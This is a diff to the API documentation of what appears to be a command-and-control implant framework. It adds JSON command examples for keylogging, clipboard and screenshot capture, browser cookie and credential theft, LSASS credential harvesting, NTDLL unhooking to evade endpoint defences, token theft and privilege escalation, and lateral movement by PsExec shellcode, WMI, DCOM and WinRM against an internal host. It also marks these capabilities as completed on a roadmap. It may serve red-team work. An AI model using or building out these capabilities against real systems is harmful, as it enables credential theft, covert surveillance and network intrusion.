@@ -144,11 +144,49 @@ Examples:
 { "command": { "ShellInput": { "session_id": "...", "data": "ZWNobyBoZWxsbwo=" } } }
 ```
 
-Interactive shell sessions are managed through `StartShell`, `ShellInput`,
-`ShellOutput`, and `CloseShell` commands. The agent opens a PTY and streams
-I/O through dedicated REST endpoints (see above). There is no arbitrary
-command execution endpoint — shells run through a sandboxed PTY managed by
-the agent.
+Extended command examples for new capabilities:
+
+```json
+{ "command": { "ExecuteAssembly": { "data": [base64 .NET PE], "args": ["arg1"], "timeout_secs": 30 } } }
+{ "command": { "ExecuteBOF": { "coff_data": [base64 COFF], "arguments": [base64], "timeout_secs": 10 } } }
+{ "command": { "CreateShell": { "shell": "cmd.exe" } } }
+{ "command": { "ShellInput": { "session_id": "abc", "data": "ZWNobyBoZWxsbwo=" } } }
+{ "command": { "ShellClose": { "session_id": "abc" } } }
+{ "command": { "ShellResize": { "session_id": "abc", "rows": 40, "cols": 120 } } }
+{ "command": "ShellList" }
+{ "command": { "Screenshot": null } }
+{ "command": { "KeyloggerStart": null } }
+{ "command": { "KeyloggerDump": null } }
+{ "command": { "ClipboardGet": null } }
+{ "command": { "BrowserData": { "browsers": ["chrome"], "types": ["cookies", "credentials"] } } }
+{ "command": "HarvestLSASS" }
+{ "command": "UnhookNtdll" }
+{ "command": { "MakeToken": { "username": "admin", "password": "pass", "domain": "CORP" } } }
+{ "command": { "StealToken": { "pid": 1234 } } }
+{ "command": "Rev2Self" }
+{ "command": "GetSystem" }
+{ "command": { "MeshConnect": { "target_agent_id": "agent-b", "transport": "tcp", "target_addr": "10.0.0.5:8445" } } }
+{ "command": { "MeshDisconnect": { "target_agent_id": "agent-b" } } }
+{ "command": "MeshKillSwitch" }
+{ "command": { "MeshQuarantine": { "target_agent_id": "agent-c", "reason": 1 } } }
+{ "command": { "MeshClearQuarantine": { "target_agent_id": "agent-c" } } }
+{ "command": { "MeshSetCompartment": { "compartment": "red-team-1" } } }
+{ "command": { "PsExec": { "target": "\\\\10.0.0.5", "service_name": "update", "shellcode": [base64] } } }
+{ "command": { "WmiExec": { "target": "10.0.0.5", "command": "whoami" } } }
+{ "command": { "DcomExec": { "target": "10.0.0.5", "command": "whoami", "method": "mmc20" } } }
+{ "command": { "WinRmExec": { "target": "10.0.0.5", "command": "whoami" } } }
+```
+
+Interactive shell sessions are managed through `CreateShell`, `ShellInput`,
+`ShellOutput`, `ShellClose`, `ShellList`, and `ShellResize` commands. The agent
+opens a PTY and streams I/O through dedicated REST endpoints (see above).
+There is no arbitrary command execution endpoint — shells run through a
+sandboxed PTY managed by the agent.
+
+P2P mesh commands (`MeshConnect`, `MeshDisconnect`, `MeshKillSwitch`,
+`MeshQuarantine`, `MeshClearQuarantine`, `MeshSetCompartment`) control the
+agent's peer-to-peer topology. See [P2P_MESH.md](P2P_MESH.md) for the full
+mesh networking documentation.
 
 ## WebSocket authentication
 
@@ -388,7 +426,9 @@ See `common/src/crypto.rs` for the implementation and its unit tests.
 Aligned with [`ROADMAP.md`](../ROADMAP.md):
 
 - ~~HMAC-signed audit events (tamper-evident).~~ **Completed** — each JSONL entry is HMAC-SHA256 signed.
-- OIDC / SSO for operator login.
-- Per-operator RBAC tied to the cert CN once mTLS is the default
-  operator path.
 - ~~WebSocket-streamed shell sessions backed by `Command::ShellInput` / `ShellOutput`.~~ **Completed** — REST shell API and PTY sessions are live.
+- ~~P2P mesh commands.~~ **Completed** — `MeshConnect`, `MeshDisconnect`, `MeshKillSwitch`, `MeshQuarantine`, `MeshClearQuarantine`, `MeshSetCompartment`.
+- ~~Extended command set.~~ **Completed** — Token manipulation, lateral movement, .NET/BOF execution, surveillance, browser data, LSASS harvesting, NTDLL unhooking.
+- OIDC / SSO for operator login.
+- Per-operator RBAC tied to the cert CN once mTLS is the default operator path.
+- Per-command audit filtering (exclude noisy commands from audit log).
